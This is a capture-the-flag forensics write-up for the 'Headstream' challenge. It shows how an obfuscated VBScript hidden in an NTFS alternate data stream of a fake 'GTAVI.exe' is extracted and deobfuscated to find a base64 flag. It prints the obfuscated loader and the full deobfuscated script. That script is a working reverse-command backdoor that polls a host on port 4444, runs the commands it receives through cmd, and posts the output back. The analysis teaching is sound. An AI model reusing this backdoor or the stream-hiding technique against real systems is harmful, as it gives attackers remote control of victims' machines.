+++
title = "Headstream - Writeup"
draft = false
ShowToc = false
author = ["connar"]
+++

We've been given a game to analyze that is supposedly malicious. Downloading the Game.rar file, we are met with an executable named "GTAVI.exe".  
Upon running it inside a Virtual Machine (which should never be done in local systems when analyzing malware), the following error messages appear:  

![alt text](/posts/writeups/ctflib/headstream/headstream1.png)

And after clicking the 'OK' button:  

![alt text](/posts/writeups/ctflib/headstream/headstream2.png)  

Since we know that there is more to the challenge than just error messages, we ignore them and try to analyze the executable inside Ghidra tool which is basically a reverse engineering tool. This will end up being a rabbit whole. The most informative artifact we can find is the following:  

![alt text](/posts/writeups/ctflib/headstream/headstream3.png)  

Searching what “ExeScript” is, we find that it is a tool that converts scripts to executables. So our file isn’t really an executable, but a script written in some programming language that is yet unknown to us, and that got later converted to an executable.  
The Ghidra tool, or any other tool in general won’t help us analyze it further. We have to keep in mind that this is not a reverse engineering challenge but a forensic one, so we should instead focus and analyze the file itself since we know that it is some script masked as executable.  
There are plenty ways to do this, with the simpler being windows dir command line options which reveals information about a file based on the option specified. Let’s try out a few options to see what is file really is. In windows, we can get information about a file with the dir command. To view some of the most popular options for dir, we can run help dir in cmd:  

![alt text](/posts/writeups/ctflib/headstream/headstream4.png)  

Starting to try a few of the options, we get to a strange output in the dir /r one which according to the help manual shows alternate data streams of the file:  

![alt text](/posts/writeups/ctflib/headstream/headstream5.png)

This output was far more interesting than the rest. It displays a “wininit.vbs” file and “$DATA” specifier at the end. Not knowing what Alternate data streams are, we google it. Immediately after we search it up, we get a lot of articles referring to this as a technique for hackers to store malicious payloads inside a file:  

![alt text](/posts/writeups/ctflib/headstream/headstream6.png)  

So we are definitely in the right track. We see that Alternate data streams are used to hide data inside a file. Ideally we would like to extract the data hidden in the GTAVI.exe, which in our case is a script called “wininit.vbs”.  
Turning back to google, we find that there are various ways to extract hidden ADS data inside a file, with one being the following Powershell command:  

```ps
PS C:\Users\connar> Get-Content -path .\GTAVI.exe -Stream wininit.vbs
Execute(chr(-658+CLng("&H2e1"))&chr(CLng("&H9e")-46)&chr(-84831+CLng("&H14bd3"))&chr(3372810/CLng("&H7d7a"))&chr(CLng("&H13c99")-80938)&chr(6582950/CLng("&He9c5"))&chr(1184000/CLng("&H9088"))&chr(2118990/CLng("&H77f6"))&chr(-49617+CLng("&Hc249"))&chr(-72592+CLng("&H11c00"))&chr(8797896/CLng("&H13e36"))&chr(1559775/CLng("&H3a07"))&chr(CLng("&H1f38")-7893)&chr(CLng("&H741")-1752)&chr(-40228+CLng("&H9d98"))&chr(-219+CLng("&He5"))&chr(-51578+CLng("&Hc9c9"))&chr(3908740/CLng("&H8ace"))&chr(CLng("&H13bea")-80842)&chr(CLng("&Hac70")-44075)&chr(4605144/CLng("&H9dcc"))&chr(3951240/CLng("&H8764"))&chr(-43857+CLng("&Habc0"))&chr(-85810+CLng("&H14fa4"))&chr(CLng("&H75ee")-30158)&chr(2633266/CLng("&H7d71"))&chr(CLng("&H118e")-4393)&chr(4670380/CLng("&H9ea4"))&chr(4316130/CLng("&H901a"))&chr(-34584+CLng("&H8785"))&chr(464297/CLng("&H11f5"))&chr(1108032/CLng("&H8742"))&chr(-60845+CLng("&Hedfb"))&chr(7913047/CLng("&H1320b"))&chr(-36133+CLng("&H8d9d"))&chr(10981024/CLng("&H171c8"))&chr(455520/CLng("&Hb1f0"))&chr(CLng("&H15525")-87323)&chr(CLng("&Hc375")-49970)&chr(6283344/CLng("&H136b0"))&chr(1773486/CLng("&H58d1"))&chr(-22086+CLng("&H5699"))&chr(7773360/CLng("&H1697c"))&chr(CLng("&H6edb")-28347)&chr(-44523+CLng("&Hae4e"))&chr(CLng("&H13f72")-81681)&chr(1170396/CLng("&H2a55"))&chr(CLng("&Hdc9e")-56370)&chr(-7656+CLng("&H1e4a"))&chr(4666088/CLng("&Hbbe8"))&chr(-9737+CLng("&H266c"))&chr(-67498+CLng("&H10815"))&chr(-88804+CLng("&H15b39"))&chr(CLng("&H15b7f")-88845)&chr(-87680+CLng("&H156ec"))&chr(110016/CLng("&Hd6e"))&chr(CLng("&Ha5e7")-42410)&chr(CLng("&He821")-59393)&chr(-60882+CLng("&Hedf4"))&chr(4223960/CLng("&H9ea7"))&chr(CLng("&Hde5c")-56808)&chr(156600/CLng("&H546"))&chr(CLng("&H2119")-8361)&chr(-14255+CLng("&H37e9"))&chr(1476458/CLng("&H7ab6"))&chr(169153/CLng("&He0f"))&chr(CLng("&H138d7")-80038)&chr(CLng("&H11d8d")-73044)&chr(2498000/CLng("&Hc328"))&chr(-28775+CLng("&H7095"))&chr(-38472+CLng("&H9679"))&chr(4931118/CLng("&H164b5"))&chr(2246720/CLng("&H9cb8"))&chr(2820444/CLng("&Hef82"))&chr(3714006/CLng("&Hfe86"))&chr(-70681+CLng("&H11452"))&chr(4318066/CLng("&H16eaf"))&chr(1358761/CLng("&H6425"...
```

And we get a lot of nonsense, which seems to be obfuscated code (whenever we have text that seems confusing, it is most probably been obfuscated).  
So how do we go about recovering the actual context ?  
We see that the hidden file is named “wininit.vbs”. We must pay attention in the “vbs” extension. With the info we have so far, we can search for how to deobfuscate vbs, which will essentially lead us to the following online tool:  
- https://isvbscriptdead.com/vbs-obfuscator/

Visiting the online tool, it is suggested to replace the “Execute” keyword in our output with “MsgBox”, store this in a new file with “vbs” extension and run it. Following these instructions and running the script, we get the deobfuscated code:  

```vbs
Option Explicit
On Error Resume Next

CONST callbackUrl = "http://192.168.99.5:4444/"

Dim xmlHttpReq, shell, execObj, command, break, result

Set shell = CreateObject("WScript.Shell")

break = False
fso = "Q1RGTElCe2gxZGQxbmdfMW5fdEgzX3N0UjM0bX0="
While break <> True
	Set xmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
	xmlHttpReq.Open "GET", callbackUrl, false
	xmlHttpReq.Send

	command = "cmd /c" & Trim(xmlHttpReq.responseText)

	if InStr(command, "EXIT") Then
		break = True
	Else
		Set execObj = shell.Exec(command)
		
		result = ""
		Do Until execObj.StdOut.AtEndOfStream
			result = result & execObj.StdOut.ReadAll()
		Loop

		Set xmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
		xmlHttpReq.Open "POST", callbackUrl, false
		xmlHttpReq.Send(result)
	End If
Wend
```

We are met with this deobfuscated VBS script. Analyzing the script further does not lead to anything interesting. The only thing that is suspicious is a variable called fso that is not used at all in the script. This variable is equal to a value that seems like a base64 encoded string (because of the equal sign in the end).  
Trying to decode it with CyberChef, we get a flag:  
```py
>>> from base64 import b64decode
>>> b64decode("Q1RGTElCe2gxZGQxbmdfMW5fdEgzX3N0UjM0bX0=")
b'CTFLIB{h1dd1ng_1n_tH3_stR34m}'
>>>
```

Turns out that sometimes the simplest ways to analyze a file goes unnoticed to an analyst. We saw that the power of a reverse tool could not help at all, but some simple command line options solved the problem.  
This shows that not all tools can be used for all the problems.







